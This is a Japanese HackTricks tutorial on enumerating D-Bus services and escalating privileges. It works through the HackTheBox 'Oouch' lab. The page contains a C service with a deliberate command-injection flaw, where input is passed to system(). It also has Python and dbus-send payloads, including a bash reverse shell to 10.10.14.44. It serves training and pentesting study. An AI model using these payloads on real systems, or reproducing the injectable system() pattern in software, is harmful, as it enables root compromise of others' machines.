# D-Bus列挙およびコマンドインジェクション特権昇格

<details>

<summary><strong>**htARTE（HackTricks AWS Red Team Expert）**で**ゼロからヒーローまでのAWSハッキング**を学びましょう！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)をフォローする
- **ハッキングトリックを共有するために、** [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する

</details>

## **GUI列挙**

Ubuntuデスクトップ環境では、D-Busがプロセス間通信（IPC）の仲介者として使用されています。Ubuntuでは、複数のメッセージバスが同時に動作しており、システムバスは**特権のあるサービスがシステム全体で利用するサービスを公開する**ために主に使用され、ログインしているユーザーごとにセッションバスがあり、その特定のユーザーにのみ関連するサービスを公開します。ここでは、特権昇格を目的としているため、特権の高い権限（たとえば、root）で実行されているサービスに関連するシステムバスに焦点を当てています。D-Busのアーキテクチャでは、セッションバスごとに「ルーター」が使用され、クライアントメッセージをクライアントが通信したいサービスに基づいて適切なサービスにリダイレクトする責任があります。

D-Bus上のサービスは、公開されている**オブジェクト**と**インターフェース**によって定義されます。オブジェクトは、標準のOOP言語のクラスインスタンスに似ており、各インスタンスは**オブジェクトパス**によって一意に識別されます。このパスは、ファイルシステムパスに似ており、サービスによって公開されている各オブジェクトを一意に識別します。研究目的で重要なインターフェースは、**org.freedesktop.DBus.Introspectable**インターフェースで、Introspectという単一のメソッドを備えています。このメソッドは、オブジェクトがサポートするメソッド、シグナル、およびプロパティのXML表現を返しますが、ここではプロパティとシグナルを省略してメソッドに焦点を当てています。

D-Busインターフェースとの通信には、2つのツールが使用されました。スクリプトでD-Busによって公開されたメソッドを簡単に呼び出すためのCLIツールである**gdbus**と、PythonベースのGUIツールである[**D-Feet**](https://wiki.gnome.org/Apps/DFeet)です。
```bash
sudo apt-get install d-feet
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)


最初の画像では、D-Busシステムバスに登録されたサービスが表示され、**org.debin.apt**がSystem Busボタンを選択した後に特に強調されています。D-Feetはこのサービスに対してオブジェクトをクエリし、選択したオブジェクトのインターフェース、メソッド、プロパティ、およびシグナルを表示します。これは2番目の画像で見られます。各メソッドのシグネチャも詳細に表示されます。

注目すべき特徴として、サービスの**プロセスID（pid）**と**コマンドライン**が表示され、サービスが昇格された権限で実行されているかどうかを確認するのに役立ち、研究の関連性に重要です。

**D-Feetはまたメソッドの呼び出しを許可**します：ユーザーはPython式をパラメーターとして入力でき、D-FeetはこれをD-Busタイプに変換してからサービスに渡します。

ただし、**一部のメソッドは認証が必要**で、これらのメソッドを呼び出す前に認証が必要です。私たちの目標は、まず資格情報なしで特権を昇格させることなので、これらのメソッドは無視します。

また、一部のサービスが、特定のアクションを実行してもよいかどうかをユーザーに許可するかどうかを判断するために、別のD-Busサービスであるorg.freedeskto.PolicyKit1をクエリすることに注意してください。

## **Cmd line列挙**

### サービスオブジェクトのリスト

D-Busインターフェースを開いたリストを次のように表示することができます：
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### 接続

[ウィキペディアより:](https://en.wikipedia.org/wiki/D-Bus) プロセスがバスに接続を設定すると、バスはその接続に _ユニーク接続名_ と呼ばれる特別なバス名を割り当てます。このタイプのバス名は不変です — 接続が存在する限り変更されないことが保証されており、さらに重要なことに、バスの寿命中に再利用されることはありません。つまり、同じプロセスがバスへの接続を閉じて新しい接続を作成しても、そのようなユニーク接続名が割り当てられることはありません。ユニーク接続名は、それらが—通常禁止されている—コロン文字で始まるため、簡単に認識できます。

### サービスオブジェクト情報

次に、インターフェイスに関するいくつかの情報を取得できます:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### サービスオブジェクトのインターフェースをリストアップします

十分な権限が必要です。
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### サービスオブジェクトのインターフェースを調査する

この例では、`tree`パラメータを使用して最新のインターフェースが選択されたことに注意してください（_前のセクションを参照_）。
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
### モニター/キャプチャーインターフェース

十分な権限があれば（`send_destination` と `receive_sender` 権限だけでは不十分）、**D-Bus通信を監視**することができます。

**通信を監視**するには、**root**である必要があります。まだrootであることに問題がある場合は、[https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) と [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus) を確認してください。

{% hint style="warning" %}
D-Bus構成ファイルを構成して**非rootユーザーが通信をスニッフィング**できるようにする方法をご存知の場合は、**お知らせください**！
{% endhint %}

監視するための異なる方法：
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
以下の例では、インターフェース`htb.oouch.Block`が監視され、**"**_**lalalalal**_**"**というメッセージが誤った通信経由で送信されます。
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
#### すべてのノイズをフィルタリングする <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

バス上に情報があふれている場合は、次のように一致ルールを渡します：
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
複数のルールを指定できます。メッセージがルールのいずれかに一致すると、そのメッセージが表示されます。次のように:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
参考: [D-Busのドキュメント](http://dbus.freedesktop.org/doc/dbus-specification.html) で、マッチルールの構文に関する詳細情報を確認してください。

### その他

`busctl` にはさらに多くのオプションがあります。[**こちらですべてを見つける**](https://www.freedesktop.org/software/systemd/man/busctl.html)。

## **脆弱性シナリオ**

HTBのホスト"oouch"内のユーザー**qtc**として、_**/etc/dbus-1/system.d/htb.oouch.Block.conf**_ という予期しないD-Bus構成ファイルが見つかります。
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
前の設定から、このD-BUS通信を介して情報を送受信するには、ユーザー`root`または`www-data`である必要があることに注意してください。

Dockerコンテナ**aeb4525789d8**内のユーザー**qtc**として、ファイル_/code/oouch/routes.py_でdbus関連のコードを見つけることができます。興味深いコードは次のとおりです：
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
如何見て取れるように、**D-Busインターフェースに接続** し、"Block" 関数に "client\_ip" を送信しています。

D-Bus接続のもう一方には、いくつかのCコンパイルされたバイナリが実行されています。このコードは、D-Bus接続でIPアドレスを**リッスン**し、`system` 関数を介してiptablesを呼び出して、指定されたIPアドレスをブロックしています。\
**`system`への呼び出しは、意図的にコマンドインジェクションの脆弱性**を持っているため、次のようなペイロードがリバースシェルを作成します: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### 悪用方法

このページの最後に、D-Busアプリケーションの**完全なCコード**があります。その中には、**`D-Busオブジェクトパス`** と **`インターフェース名`** が **登録** されている91-97行の間に見つけることができます。この情報は、D-Bus接続に情報を送信するために必要になります：
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
また、57行目では、このD-Bus通信に登録されている**唯一のメソッド**が`Block`と呼ばれていることがわかります（_**そのため、次のセクションでは、ペイロードがサービスオブジェクト`htb.oouch.Block`、インターフェース`/htb/oouch/Block`、およびメソッド名`Block`に送信されることになります**_）:
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

以下のPythonコードは、`block_iface.Block(runme)`を介して`Block`メソッドにペイロードをD-Bus接続に送信します（_前のコードチャンクから抽出されたことに注意してください_）:
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctlとdbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
* `dbus-send`は「メッセージバス」にメッセージを送信するためのツールです。
* メッセージバス - システム間の通信を容易にするためにシステムで使用されるソフトウェアです。メッセージキューに関連しています（メッセージは順番に並んでいます）が、メッセージバスではメッセージが購読モデルで送信され、非常に迅速です。
* 「-system」タグは、セッションメッセージではなくシステムメッセージであることを示すために使用されます（デフォルトでは）。
* 「--print-reply」タグは、メッセージを適切に表示し、人間が読める形式で返信を受け取るために使用されます。
* 「--dest=Dbus-Interface-Block」はDbusインターフェースのアドレスです。
* 「--string:」- インターフェースに送信したいメッセージのタイプです。ダブル、バイト、ブール、整数、オブジェクトパスなど、メッセージを送信するためのいくつかのフォーマットがあります。このうち、「オブジェクトパス」は、ファイルのパスをDbusインターフェースに送信したい場合に便利です。この場合、特別なファイル（FIFO）を使用して、ファイルの名前でインターフェースにコマンドを渡すことができます。「string:;」- これは、再びオブジェクトパスを呼び出すためのもので、FIFOリバースシェルファイル/コマンドの場所を置く場所です。

_`htb.oouch.Block.Block`では、最初の部分（`htb.oouch.Block`）がサービスオブジェクトを参照し、最後の部分（`.Block`）がメソッド名を参照しています。_

### Cコード

{% code title="d-bus_server.c" %}
```c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
{% endcode %}

# 参考文献
* [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を通じてゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**する。
* **HackTricks**および**HackTricks Cloud**のgithubリポジトリにPRを提出して、**ハッキングトリックを共有**してください。

</details>
